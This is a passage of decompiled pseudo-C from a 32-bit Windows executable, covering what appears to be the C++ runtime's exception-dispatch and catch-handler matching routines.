    *(int32_t *)result = (int32_t)&g23;
    return result;
}

// Address range: 0x4074ef - 0x40750e
int32_t function_4074ef(int32_t a1) {
    // 0x4074ef
    int32_t v1; // 0x4074ef
    int32_t v2; // 0x4074ef
    int32_t v3 = function_40730a(v2 + 4, a1 + 4, v1); // 0x4074fd
    return -v3 & -256 | (int32_t)(v3 == 0);
}

// Address range: 0x40750e - 0x407598
int32_t function_40750e(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    // 0x40750e
    function_406770(&g83, 56, (int32_t)&g266);
    int32_t v1; // 0x40750e
    int32_t * v2 = (int32_t *)(v1 + 24); // 0x40751a
    int32_t * v3 = (int32_t *)(v1 - 28); // 0x40751d
    *v3 = *v2;
    *(int32_t *)(v1 - 60) = 0;
    int32_t v4 = *(int32_t *)(v1 + 12); // 0x407524
    *(int32_t *)(v1 - 44) = *(int32_t *)(v4 - 4);
    int32_t v5 = *(int32_t *)(v1 + 8); // 0x40752d
    *(int32_t *)(v1 - 48) = function_406d8f(v1 - 72, *(int32_t *)(v5 + 24));
    *(int32_t *)(v1 - 52) = *(int32_t *)(function_407362() + 16);
    *(int32_t *)(v1 - 56) = *(int32_t *)(function_407362() + 20);
    *(int32_t *)(function_407362() + 16) = v5;
    *(int32_t *)(function_407362() + 20) = *(int32_t *)(v1 + 16);
    int32_t * v6 = (int32_t *)(v1 - 4); // 0x40756a
    *(int32_t *)(v1 - 64) = 1;
    *v6 = 1;
    int32_t v7 = *v2; // 0x40757d
    int32_t v8 = *(int32_t *)(v1 + 20); // 0x407580
    *v3 = 1;
    *v6 = 0;
    return function_407628(v4, v8, v7, *(int32_t *)(v1 + 28), *(int32_t *)(v1 + 32));
}

// Address range: 0x407598 - 0x4075a2
int32_t function_407598(void) {
    // 0x407598
    int32_t v1; // 0x407598
    return function_40777d(*(int32_t *)(v1 - 20));
}

// Address range: 0x4075a2 - 0x407628
int32_t function_4075a2(void) {
    // 0x4075a2
    int32_t v1; // 0x4075a2
    int32_t v2 = *(int32_t *)(v1 - 24); // 0x4075a2
    *(int32_t *)(function_407362() + 32) = 0;
    int32_t v3 = *(int32_t *)(v1 + 20); // 0x4075ae
    int32_t * v4 = (int32_t *)(v1 + 12); // 0x4075b1
    int32_t v5 = *v4; // 0x4075b1
    int32_t v6 = v5 + 8;
    int32_t v7; // 0x4075a2
    if (*(int32_t *)(v3 + 4) > 128) {
        // 0x4075c3
        v7 = *(int32_t *)v6;
    } else {
        // 0x4075bd
        v7 = (int32_t)*(char *)v6;
    }
    int32_t * v8 = (int32_t *)(v1 - 32); // 0x4075c6
    *v8 = v7;
    int32_t * v9 = (int32_t *)(v1 - 40); // 0x4075ce
    *v9 = 0;
    int32_t * v10 = (int32_t *)(v3 + 12); // 0x4075d1
    int32_t v11 = v5; // 0x4075d4
    int32_t v12 = v7; // 0x4075d4
    if (*v10 != 0) {
        int32_t v13 = 0; // 0x407607
        int32_t v14; // 0x4075dc
        int32_t v15; // 0x4075e0
        while (true) {
            int32_t v16 = 20 * v13; // 0x4075d6
            *(int32_t *)(v1 - 36) = v16;
            int32_t v17 = v16 + *(int32_t *)(v3 + 16);
            v14 = *(int32_t *)(v17 + 4);
            v15 = *v4;
            if (v7 > v14) {
                // 0x4075e5
                if (v7 <= *(int32_t *)(v17 + 8)) {
                    // break -> 0x4075f1
                    break;
                }
            }
            // 0x407607
            v13++;
            *v9 = v13;
            v11 = v15;
            v12 = v7;
            if (v13 >= *v10) {
                goto lab_0x407610;
            }
        }
        int32_t v18 = v14 + 1; // 0x4075f8
        *v8 = v18;
        int32_t v19 = *(int32_t *)(*(int32_t *)(v3 + 8) + 8 * v18); // 0x4075ff
        *v8 = v19;
        v11 = v15;
        v12 = v19;
    }
  lab_0x407610:
    // 0x407610
    *(int32_t *)(v2 - 4) = v12;
    *(int32_t *)(v2 - 8) = v3;
    *(int32_t *)(v2 - 12) = 0;
    *(int32_t *)(v2 - 16) = v11;
    int32_t result = function_407ee5(); // 0x407615
    *(int32_t *)(v1 - 28) = 0;
    *(int32_t *)(v1 - 4) = 0;
    return result;
}

// Address range: 0x407628 - 0x407643
int32_t function_407628(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x407628
    int32_t v1; // 0x407628
    *(int32_t *)(v1 - 4) = -2;
    *(int32_t *)(v1 - 64) = 0;
    function_407649();
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40763d
    return result;
}

// Address range: 0x407649 - 0x4076ca
int32_t function_407649(void) {
    // 0x407649
    int32_t v1; // 0x407649
    int32_t v2; // 0x407649
    *(int32_t *)(v2 - 4) = *(int32_t *)(v1 - 44);
    function_406db3(*(int32_t *)(v1 - 48));
    *(int32_t *)(function_407362() + 16) = *(int32_t *)(v1 - 52);
    int32_t result = function_407362(); // 0x407663
    *(int32_t *)(result + 20) = *(int32_t *)(v1 - 56);
    int32_t v3; // 0x407649
    if (v3 != -0x1f928c9d || *(int32_t *)(v3 + 16) != 3) {
        // 0x4076c9
        return result;
    }
    int32_t v4 = *(int32_t *)(v3 + 20); // 0x40767c
    if ((v4 & -2) != 0x19930520 == (v4 != 0x19930522) || *(int32_t *)(v1 - 28) == 0 | *(int32_t *)(v1 - 60) != 0) {
        // 0x4076c9
        return result;
    }
    int32_t result2 = 0; // 0x4076af
    if (function_40884e(*(int32_t *)(v3 + 24)) != 0) {
        // 0x4076b1
        result2 = function_4087ab();
    }
    // 0x4076c9
    return result2;
}

// Address range: 0x4076ca - 0x407703
int32_t function_4076ca(void) {
    // 0x4076ca
    function_4112e3(4, (int32_t)&g266);
    if (*(int32_t *)(function_407362() + 28) != 0) {
        // 0x4076fe
        function_40a896();
        // UNREACHABLE
    }
    // 0x4076e1
    int32_t v1; // 0x4076ca
    *(int32_t *)(v1 - 4) = 0;
    function_40878e();
    // UNREACHABLE
}

// Address range: 0x407704 - 0x40777d
int32_t function_407704(char a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10) {
    int32_t v1 = a1;
    if (a7 != 0) {
        // 0x407716
        int32_t v2; // 0x407704
        int32_t v3; // 0x407704
        int32_t v4; // 0x407704
        int32_t v5; // 0x407704
        function_407d22(v1, a2, a6, 0x1000000 * a7 / 0x1000000, v2, v3, v5, v4);
    }
    // 0x407726
    function_406d09(a10 != 0 ? a10 : a2, v1);
    function_407ee5();
    *(int32_t *)(a2 + 8) = *(int32_t *)(a8 + 4) + 1;
    return function_40750e(v1, a2, a3, a5, *(int32_t *)(a6 + 12), a9, 256);
}

// Address range: 0x40777d - 0x4077c7
int32_t function_40777d(int32_t a1) {
    int32_t v1 = *(int32_t *)a1; // 0x407783
    if (*(int32_t *)v1 != -0x1f928c9d || *(int32_t *)(v1 + 16) != 3) {
        // 0x4077c3
        return 0;
    }
    int32_t v2 = *(int32_t *)(v1 + 20); // 0x407793
    if ((v2 & -2) != 0x19930520 == (v2 != 0x19930522) || *(int32_t *)(v1 + 28) != 0) {
        // 0x4077c3
        return 0;
    }
    // 0x4077b4
    *(int32_t *)(function_407362() + 32) = 1;
    return 1;
}

// Address range: 0x4077c7 - 0x407b47
int32_t function_4077c7(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, char a6, int32_t a7, int32_t a8) {
    int32_t v1 = *(int32_t *)(a5 + 4); // 0x4077de
    int32_t v2 = a2 + 8;
    int32_t v3; // 0x4077c7
    if (v1 > 128) {
        // 0x4077ed
        v3 = *(int32_t *)v2;
    } else {
        // 0x4077e7
        v3 = (int32_t)*(char *)v2;
    }
    int32_t v4 = v3;
    if (v4 > -2 != v4 < v1) {
        // 0x407afb
        function_40a896();
        // UNREACHABLE
    }
    int32_t * v5 = (int32_t *)a1;
    int32_t v6 = a3; // 0x40780e
    int32_t v7 = a1; // 0x40780e
    int32_t v8; // 0x4077c7
    int32_t v9; // 0x4077c7
    int32_t v10; // 0x4077c7
    int32_t v11; // 0x4077c7
    int32_t v12; // 0x4077c7
    int32_t v13; // 0x4077c7
    int32_t v14; // bp-24, 0x4077c7
    int32_t v15; // 0x4077c7
    int32_t v16; // 0x4077c7
    int32_t v17; // bp-48, 0x4077c7
    char v18; // 0x4077c7
    char v19; // 0x4077c7
    char v20; // 0x4077c7
    char v21; // 0x4077c7
    if (*v5 != -0x1f928c9d) {
        goto lab_0x407aa8;
    } else {
        // 0x407814
        int32_t v22; // bp-84, 0x4077c7
        int32_t v23 = &v22; // 0x4077d2
        int32_t * v24 = v5; // 0x407818
        int32_t v25 = a3; // 0x407818
        int32_t v26 = 0; // 0x407818
        int32_t v27 = a1; // 0x407818
        if (*(int32_t *)(a1 + 16) == 3) {
            int32_t v28 = *(int32_t *)(a1 + 20); // 0x40781e
            v24 = v5;
            v25 = a3;
            v26 = 0;
            v27 = a1;
            if ((v28 & -2) != 0x19930520 != v28 != 0x19930522) {
                // 0x40783d
                v24 = v5;
                v25 = a3;
                v26 = 0;
                v27 = a1;
                if (*(int32_t *)(a1 + 28) == 0) {
                    int32_t result = function_407362(); // 0x407846
                    if (*(int32_t *)(result + 16) == 0) {
                        // 0x407ad4
                        return result;
                    }
                    int32_t v29 = *(int32_t *)(function_407362() + 16); // 0x407859
                    int32_t v30 = function_407362(); // 0x40785c
                    if (v29 == 0) {
                        // 0x407afb
                        function_40a896();
                        // UNREACHABLE
                    }
                    int32_t v31 = *(int32_t *)(v30 + 20); // 0x407865
                    int32_t * v32 = (int32_t *)v29;
                    if (*v32 == -0x1f928c9d) {
                        // 0x40787b
                        if (*(int32_t *)(v29 + 16) == 3) {
                            int32_t v33 = *(int32_t *)(v29 + 20); // 0x407881
                            if ((v33 & -2) != 0x19930520 != v33 != 0x19930522) {
                                // branch -> 0x4078a5
                            }
                        }
                    }
                    int32_t v34 = *(int32_t *)(function_407362() + 28); // 0x4078aa
                    v24 = v32;
                    v25 = v31;
                    v26 = 1;
                    v27 = v29;
                    if (v34 != 0) {
                        int32_t v35 = *(int32_t *)(function_407362() + 28); // 0x4078b4
                        *(int32_t *)(function_407362() + 28) = 0;
                        int32_t v36 = function_407c63(v29, v35); // 0x4078c6
                        v24 = v32;
                        v25 = v31;
                        v26 = 1;
                        v27 = v29;
                        if ((char)v36 == 0) {
                            int32_t * v37 = (int32_t *)v35; // 0x4078d4
                            int32_t v38 = 0; // 0x4078d6
                            int32_t v39 = 0; // 0x4078d6
                            if (*v37 <= 0) {
                                // 0x407afb
                                function_40a896();
                                // UNREACHABLE
                            }
                            int32_t v40 = v23;
                            int32_t v41 = v40 - 4; // 0x4078e4
                            *(int32_t *)v41 = (int32_t)&g148;
                            while ((char)function_4074ef(v38) == 0) {
                                // 0x4078fa
                                v39++;
                                v38 += 16;
                                if (v39 >= *v37) {
                                    // 0x407afb
                                    function_40a896();
                                    // UNREACHABLE
                                }
                                v40 = v41;
                                v41 = v40 - 4;
                                *(int32_t *)v41 = (int32_t)&g148;
                            }
                            int32_t * v42 = (int32_t *)(v40 - 8); // 0x407adb
                            *v42 = 1;
                            int32_t * v43 = (int32_t *)(v40 - 12); // 0x407add
                            *v43 = v29;
                            function_4087ab();
                            function_4074d7();
                            *v42 = (int32_t)&g85;
                            int32_t v44; // bp-72, 0x4077c7
                            *v43 = (int32_t)&v44;
                            function_407139(&g266, &g266);
                            // 0x407afb
                            function_40a896();
                            // UNREACHABLE
                        }
                    }
                }
            }
        }
        // 0x40791b
        v6 = v25;
        v7 = v27;
        if (*v24 != -0x1f928c9d) {
            goto lab_0x407aa8;
        } else {
            // 0x407927
            v6 = v25;
            v7 = v27;
            if (*(int32_t *)(v27 + 16) != 3) {
                goto lab_0x407aa8;
            } else {
                int32_t v45 = *(int32_t *)(v27 + 20); // 0x407931
                v6 = v25;
                v7 = v27;
                if ((v45 & -2) != 0x19930520 == (v45 != 0x19930522)) {
                    goto lab_0x407aa8;
                } else {
                    // 0x407950
                    v21 = 0;
                    if (*(int32_t *)(a5 + 12) != 0) {
                        int32_t v46 = function_406c5f(a5, a7, v4, &v14, &v17); // 0x407966
                        v21 = 0;
                        if (v14 < v17) {
                            int32_t * v47 = (int32_t *)(v27 + 28);
                            int32_t * v48 = (int32_t *)(v23 - 4);
                            int32_t * v49 = (int32_t *)(v23 - 8);
                            int32_t * v50 = (int32_t *)(v23 - 12);
                            v8 = v17;
                            v15 = v46 + 16;
                            v18 = 0;
                            v10 = v4;
                            v12 = v14;
                            while (true) {
                              lab_0x407983:;
                                int32_t v51 = v12;
                                int32_t v52 = v10;
                                char v53 = v18;
                                v16 = v15;
                                int32_t v54 = v8;
                                int32_t v55 = v16 - 16; // 0x407983
                                v9 = v54;
                                v20 = v53;
                                v11 = v52;
                                v13 = v51;
                                if (*(int32_t *)v55 > v52) {
                                    goto lab_0x407a43;
                                } else {
                                    // 0x407995
                                    v9 = v54;
                                    v20 = v53;
                                    v11 = v52;
                                    v13 = v51;
                                    if (v52 > *(int32_t *)(v16 - 12)) {
                                        goto lab_0x407a43;
                                    } else {
                                        int32_t v56 = *(int32_t *)(v16 - 4); // 0x4079a3
                                        v9 = v54;
                                        v20 = v53;
                                        v11 = v52;
                                        v13 = v51;
                                        if (v56 < 1) {
                                            goto lab_0x407a43;
                                        } else {
                                            int32_t v57 = *(int32_t *)(*v47 + 12); // 0x4079b7
                                            uint32_t v58 = *(int32_t *)v57; // 0x4079ba
                                            int32_t v59 = v56;
                                            int32_t v60 = *(int32_t *)v16;
                                            int32_t v61 = v57; // 0x4079d0
                                            int32_t v62 = v58; // 0x4079d0
                                            int32_t v63; // 0x4077c7
                                            int32_t v64; // 0x4077c7
                                            int32_t * v65; // 0x4077c7
                                            int32_t v66; // 0x4079ec
                                            if (v58 >= 1) {
                                                v64 = v62;
                                                v63 = v61 + 4;
                                                *v48 = *v47;
                                                v65 = (int32_t *)v63;
                                                *v49 = *v65;
                                                *v50 = v60;
                                                if (function_4080af(v64, v63, (int32_t)&g266) != 0) {
                                                    // 0x407a11
                                                    *v48 = v26;
                                                    *v49 = a8;
                                                    *v50 = a7;
                                                    *(int32_t *)(v23 - 16) = v55;
                                                    *(int32_t *)(v23 - 20) = *v65;
                                                    *(int32_t *)(v23 - 24) = v60;
                                                    *(int32_t *)(v23 - 28) = a5;
                                                    *(int32_t *)(v23 - 32) = a4;
                                                    *(int32_t *)(v23 - 36) = v25;
                                                    *(int32_t *)(v23 - 40) = a2;
                                                    *(int32_t *)(v23 - 44) = v27;
                                                    function_407704(1, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                                                    v19 = 1;
                                                    goto lab_0x407a3a;
                                                }
                                                // 0x4079e6
                                                v66 = v64 - 1;
                                                v61 = v63;
                                                while (v66 >= 0 == (v66 != 0)) {
                                                    // 0x4079d2
                                                    v64 = v66;
                                                    v63 = v61 + 4;
                                                    *v48 = *v47;
                                                    v65 = (int32_t *)v63;
                                                    *v49 = *v65;
                                                    *v50 = v60;
                                                    if (function_4080af(v64, v63, (int32_t)&g266) != 0) {
                                                        // 0x407a11
                                                        *v48 = v26;
                                                        *v49 = a8;
                                                        *v50 = a7;
                                                        *(int32_t *)(v23 - 16) = v55;
                                                        *(int32_t *)(v23 - 20) = *v65;
                                                        *(int32_t *)(v23 - 24) = v60;
                                                        *(int32_t *)(v23 - 28) = a5;
                                                        *(int32_t *)(v23 - 32) = a4;
                                                        *(int32_t *)(v23 - 36) = v25;
                                                        *(int32_t *)(v23 - 40) = a2;
                                                        *(int32_t *)(v23 - 44) = v27;
                                                        function_407704(1, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                                                        v19 = 1;
                                                        goto lab_0x407a3a;
                                                    }
                                                    // 0x4079e6
                                                    v66 = v64 - 1;
                                                    v61 = v63;
                                                }
                                            }
                                            // 0x4079fd
                                            v19 = v53;
                                            while (v59 >= 2) {
                                                // 0x407a09
                                                v59--;
                                                v60 += 16;
                                                v61 = v57;
                                                v62 = v58;
                                                if (v58 >= 1) {
                                                    v64 = v62;
                                                    v63 = v61 + 4;
                                                    *v48 = *v47;
                                                    v65 = (int32_t *)v63;
                                                    *v49 = *v65;
                                                    *v50 = v60;
                                                    if (function_4080af(v64, v63, (int32_t)&g266) != 0) {
                                                        // 0x407a11
                                                        *v48 = v26;
                                                        *v49 = a8;
                                                        *v50 = a7;
                                                        *(int32_t *)(v23 - 16) = v55;
                                                        *(int32_t *)(v23 - 20) = *v65;
                                                        *(int32_t *)(v23 - 24) = v60;
                                                        *(int32_t *)(v23 - 28) = a5;
                                                        *(int32_t *)(v23 - 32) = a4;
                                                        *(int32_t *)(v23 - 36) = v25;
                                                        *(int32_t *)(v23 - 40) = a2;
                                                        *(int32_t *)(v23 - 44) = v27;
                                                        function_407704(1, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                                                        v19 = 1;
                                                        goto lab_0x407a3a;
                                                    }
                                                    // 0x4079e6
                                                    v66 = v64 - 1;
                                                    v61 = v63;
                                                    while (v66 >= 0 == (v66 != 0)) {
                                                        // 0x4079d2
                                                        v64 = v66;
                                                        v63 = v61 + 4;
                                                        *v48 = *v47;
                                                        v65 = (int32_t *)v63;
                                                        *v49 = *v65;
                                                        *v50 = v60;
                                                        if (function_4080af(v64, v63, (int32_t)&g266) != 0) {
                                                            // 0x407a11
                                                            *v48 = v26;
                                                            *v49 = a8;
                                                            *v50 = a7;
                                                            *(int32_t *)(v23 - 16) = v55;
                                                            *(int32_t *)(v23 - 20) = *v65;
                                                            *(int32_t *)(v23 - 24) = v60;
                                                            *(int32_t *)(v23 - 28) = a5;
                                                            *(int32_t *)(v23 - 32) = a4;
                                                            *(int32_t *)(v23 - 36) = v25;
                                                            *(int32_t *)(v23 - 40) = a2;
                                                            *(int32_t *)(v23 - 44) = v27;
                                                            function_407704(1, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                                                            v19 = 1;
                                                            goto lab_0x407a3a;
                                                        }
                                                        // 0x4079e6
                                                        v66 = v64 - 1;
                                                        v61 = v63;
                                                    }
                                                }
                                                // 0x4079fd
                                                v19 = v53;
                                            }
                                            goto lab_0x407a3a;
                                        }
                                    }
                                }
                            }
                        }
                    }
                  lab_0x407a58:
                    // 0x407a58
                    if (a6 != 0) {
                        // 0x407a5e
                        *(int32_t *)(v23 - 4) = 1;
                        *(int32_t *)(v23 - 8) = v27;
                        function_4087ab();
                    }
                    if (v21 == 0) {
                        // 0x407a6e
                        if ((*(int32_t *)a5 & 0x1fffffff) >= 0x19930521) {
                            int32_t * v67 = (int32_t *)(a5 + 28); // 0x407a7c
                            int32_t v68 = *v67; // 0x407a7c
                            char v69 = *(char *)(a5 + 32);
                            if (v68 != 0) {
                                if ((v69 & 4) != 0) {
                                    // 0x407afb
                                    function_40a896();
                                    // UNREACHABLE
                                }
                                int32_t * v70 = (int32_t *)(v23 - 4); // 0x407a94
                                *v70 = v68;
                                int32_t * v71 = (int32_t *)(v23 - 8); // 0x407a97
                                *v71 = v27;
                                if ((char)function_407c63((int32_t)&g266, (int32_t)&g266) == 0) {
                                    // 0x407b00
                                    function_407362();
                                    function_407362();
                                    *(int32_t *)(function_407362() + 16) = v27;
                                    *(int32_t *)(function_407362() + 20) = v25;
                                    *v70 = v27;
                                    *v71 = a8 != 0 ? a8 : a2;
                                    function_406d09((int32_t)&g266, (int32_t)&g266);
                                    int32_t * v72 = (int32_t *)(v23 - 12); // 0x407b2e
                                    *v72 = -1;
                                    *(int32_t *)(v23 - 16) = a5;
                                    *(int32_t *)(v23 - 20) = a4;
                                    *(int32_t *)(v23 - 24) = a2;
                                    function_407ee5();
                                    *v72 = *v67;
                                    function_4076ca();
                                    // UNREACHABLE
                                }
                            } else {
                                if (a7 == 0 && (v69 & 4) != 0) {
                                    // 0x407afb
                                    function_40a896();
                                    // UNREACHABLE
                                }
                            }
                        }
                    }
                    goto lab_0x407aca;
                }
            }
        }
    }
  lab_0x407a43:;
    int32_t v73 = v13 + 1; // 0x407a43
    v14 = v73;
    v8 = v9;
    v15 = v16 + 20;
    v18 = v20;
    v10 = v11;
    v12 = v73;
    v21 = v20;
    if (v73 >= v9) {
        // break -> 0x407a58
        goto lab_0x407a58;
    }
    goto lab_0x407983;
  lab_0x407a3a:
    // 0x407a3a
    v9 = v17;
    v20 = v19;
    v11 = v4;
    v13 = v14;
    goto lab_0x407a43;
  lab_0x407aa8:
    // 0x407aa8
    if (*(int32_t *)(a5 + 12) != 0) {
        if (a6 != 0) {
            // 0x407afb
            function_40a896();
            // UNREACHABLE
        }
        // 0x407ab2
        function_407b48(v7, a2, v6, a4, a5, v4, a7, a8);
    }
    goto lab_0x407aca;
  lab_0x407aca:;
    int32_t result2 = function_407362(); // 0x407aca
    if (*(int32_t *)(result2 + 28) == 0) {
        // 0x407ad4
        return result2;
    }
    // 0x407afb
    function_40a896();
    // UNREACHABLE
}

// Address range: 0x407b48 - 0x407c62
int32_t function_407b48(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t result3, int32_t a7, int32_t a8) {
    int32_t * v1 = (int32_t *)a1; // 0x407b51
    int32_t result; // 0x407b48
    if (*v1 == -0x7ffffffd) {
        // 0x407c58
        return result;
    }
    int32_t v2 = *(int32_t *)(function_407362() + 8); // 0x407b67
    int32_t v3; // bp-24, 0x407b48
    int32_t v4 = &v3; // 0x407b6b
    if (v2 == 0) {
        goto lab_0x407bb2;
    } else {
        int32_t v5 = 0; // bp-28, 0x407b6d
        int32_t v6 = &v5; // 0x407b6d
        int32_t * v7 = EncodePointer(NULL); // 0x407b6f
        int32_t v8 = *(int32_t *)(function_407362() + 8); // 0x407b7c
        v4 = v6;
        if (v8 == (int32_t)v7) {
            goto lab_0x407bb2;
        } else {
            // 0x407b81
            v4 = v6;
            switch (*v1) {
                case -0x1fbcb0b3: {
                    goto lab_0x407bb2;
                }
                case -0x1fbcbcae: {
                    goto lab_0x407bb2;
                }
                default: {
                    int32_t result2 = function_406b82(a1, a2, a3, a4, a5, a7); // 0x407ba2
                    v4 = v6;
                    if (result2 != 0) {
                        // 0x407c58
                        return result2;
                    }
                    goto lab_0x407bb2;
                }
            }
        }
    }
  lab_0x407c4b:;
    // 0x407c4b
    int32_t v9; // 0x407b48
    int32_t v10 = v9 + 1; // 0x407c4b
    int32_t v11 = v10; // bp-12, 0x407c4f
    int32_t v12; // 0x407b48
    int32_t v13 = v12; // 0x407c54
    int32_t v14 = v10; // 0x407c54
    int32_t v15; // 0x407b48
    int32_t v16 = v15; // 0x407c54
    int32_t v17; // 0x407b48
    int32_t v18 = v17 + 20; // 0x407c54
    if (v10 >= v15) {
        return result3;
    }
    goto lab_0x407be3;
  lab_0x407c10:;
    // 0x407c10
    int32_t v23; // 0x407b48
    int32_t v26 = v23 - 16; // 0x407c16
    int32_t v21; // 0x407c04
    v12 = v21;
    int32_t v20; // 0x407b48
    v9 = v20;
    int32_t v25; // 0x407b48
    v15 = v25;
    int32_t v27; // bp-8, 0x407b48
    int32_t * v28; // 0x407bbf
    int32_t * v29; // 0x407bc3
    int32_t * v30; // 0x407bc4
    int32_t * v31; // 0x407bc7
    int32_t * v32; // 0x407bca
    int32_t v22; // 0x407be3
    if ((*(char *)v26 & 64) == 0) {
        // 0x407c20
        *v28 = 1;
        *v29 = a8;
        *v30 = a7;
        *v31 = v22;
        *v32 = 0;
        *(int32_t *)(v4 - 24) = v26;
        *(int32_t *)(v4 - 28) = a5;
        *(int32_t *)(v4 - 32) = a4;
        *(int32_t *)(v4 - 36) = a3;
        *(int32_t *)(v4 - 40) = a2;
        *(int32_t *)(v4 - 44) = a1;
        function_407704((char)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        v12 = v27;
        v9 = v11;
        v15 = v27;
    }
    goto lab_0x407c4b;
  lab_0x407bb2:
    // 0x407bb2
    if (*(int32_t *)(a5 + 12) == 0) {
        // 0x407c5d
        function_40a896();
        // UNREACHABLE
    }
    // 0x407bbc
    v28 = (int32_t *)(v4 - 4);
    *v28 = (int32_t)&v27;
    v29 = (int32_t *)(v4 - 8);
    *v29 = (int32_t)&v11;
    v30 = (int32_t *)(v4 - 12);
    *v30 = result3;
    v31 = (int32_t *)(v4 - 16);
    *v31 = a7;
    v32 = (int32_t *)(v4 - 20);
    *v32 = a5;
    int32_t v33 = function_406c5f((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, &g266, &g266); // 0x407bcb
    result = v33;
    if (v11 >= v27) {
        // 0x407c58
        return result;
    }
    // 0x407bdd
    v13 = v27;
    v14 = v11;
    v16 = v27;
    v18 = v33 + 12;
    while (true) {
      lab_0x407be3:
        // 0x407be3
        v17 = v18;
        int32_t v19 = v16;
        v20 = v14;
        v21 = v13;
        v22 = v17 - 12;
        v12 = v21;
        v9 = v20;
        v15 = v19;
        if (*(int32_t *)v22 > result3) {
            goto lab_0x407c4b;
        } else {
            // 0x407be8
            v12 = v21;
            v9 = v20;
            v15 = v19;
            if (*(int32_t *)(v17 - 8) < result3) {
                goto lab_0x407c4b;
            } else {
                // 0x407bed
                v23 = *(int32_t *)(v17 + 4) + 16 * *(int32_t *)v17;
                int32_t v24 = *(int32_t *)(v23 - 12); // 0x407bf5
                v25 = v19;
                if (v24 == 0) {
                    goto lab_0x407c10;
                } else {
                    // 0x407bfd
                    v25 = v21;
                    if (*(char *)(v24 + 8) != 0) {
                        goto lab_0x407c4b;
                    } else {
                        goto lab_0x407c10;
                    }
                }
            }
        }
    }
    // 0x407c58
    return result3;
}

// Address range: 0x407c63 - 0x407cfe
int32_t function_407c63(int32_t a1, int32_t a2) {
    if (a2 == 0) {
        // 0x407cf9
        function_40a896();
        // UNREACHABLE
    }
    int32_t v1 = *(int32_t *)a2; // 0x407c77
    if (v1 < 1) {
        // 0x407cf0
        int32_t v2; // 0x407c63
        return v2 & -256;
    }
    // 0x407c7f
    int32_t v3; // bp-40, 0x407c63
    int32_t v4 = &v3; // 0x407c6e
    int32_t * v5 = (int32_t *)(a1 + 28); // 0x407c87
    int32_t v6 = *(int32_t *)(*v5 + 12); // 0x407c8a
    uint32_t v7 = *(int32_t *)v6; // 0x407c8d
    int32_t v8 = v6 + 4; // 0x407c8f
    int32_t v9 = v1; // 0x407c95
    int32_t v10 = 0;
    int32_t v11 = 0;
    int32_t v12 = v10; // 0x407ca5
    int32_t v13; // 0x407c63
    int32_t v14; // 0x407c63
    int32_t v15; // 0x407c63
    int32_t v16; // 0x407cb8
    int32_t v17; // 0x407cca
    if (v7 >= 1) {
        // 0x407ca7
        v13 = v7;
        v15 = v8;
        *(int32_t *)(v4 - 4) = *v5;
        *(int32_t *)(v4 - 8) = *(int32_t *)v15;
        *(int32_t *)(v4 - 12) = *(int32_t *)(a2 + 4) + v11;
        v16 = function_4080af(v15, v13, (int32_t)&g266);
        v12 = 1;
        while (v16 == 0) {
            // 0x407cc4
            v17 = v13 - 1;
            v14 = v15 + 4;
            v12 = v10;
            if (v17 >= 0 != v17 != 0) {
                // break -> 0x407ce2
                break;
            }
            v13 = v17;
            v15 = v14;
            *(int32_t *)(v4 - 4) = *v5;
            *(int32_t *)(v4 - 8) = *(int32_t *)v15;
            *(int32_t *)(v4 - 12) = *(int32_t *)(a2 + 4) + v11;
            v16 = function_4080af(v15, v13, (int32_t)&g266);
            v12 = 1;
        }
    }
    int32_t v18 = v12;
    v9--;
    int32_t v19 = v11 + 16; // 0x407cee
    while (v9 != 0) {
        // 0x407c98
        v10 = v18;
        v11 = v19;
        v12 = v10;
        if (v7 >= 1) {
            // 0x407ca7
            v13 = v7;
            v15 = v8;
            *(int32_t *)(v4 - 4) = *v5;
            *(int32_t *)(v4 - 8) = *(int32_t *)v15;
            *(int32_t *)(v4 - 12) = *(int32_t *)(a2 + 4) + v11;
            v16 = function_4080af(v15, v13, (int32_t)&g266);
            v12 = 1;
            while (v16 == 0) {
                // 0x407cc4
                v17 = v13 - 1;
                v14 = v15 + 4;
                v12 = v10;
                if (v17 >= 0 != v17 != 0) {
                    // break -> 0x407ce2
                    break;
                }
                v13 = v17;
                v15 = v14;
                *(int32_t *)(v4 - 4) = *v5;
                *(int32_t *)(v4 - 8) = *(int32_t *)v15;
                *(int32_t *)(v4 - 12) = *(int32_t *)(a2 + 4) + v11;
                v16 = function_4080af(v15, v13, (int32_t)&g266);
                v12 = 1;
            }
        }
        // 0x407ce2
        v18 = v12;
        v9--;
        v19 = v11 + 16;
    }
    // 0x407cf0
    return v18 & 255 | v8 & -256;
}

// Address range: 0x407cff - 0x407d0f
int32_t function_407cff(int32_t a1, int32_t a2) {
    // 0x407cff
    int32_t result; // 0x407cff
    return result;
}

// Address range: 0x407d0f - 0x407d22
int32_t function_407d0f(int32_t a1, int32_t a2, int32_t a3) {
    // 0x407d0f
    int32_t result; // 0x407d0f
    return result;
}

// Address range: 0x407d22 - 0x407da4
int32_t function_407d22(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x407d22
    function_406770(&g81, 8, (int32_t)&g266);
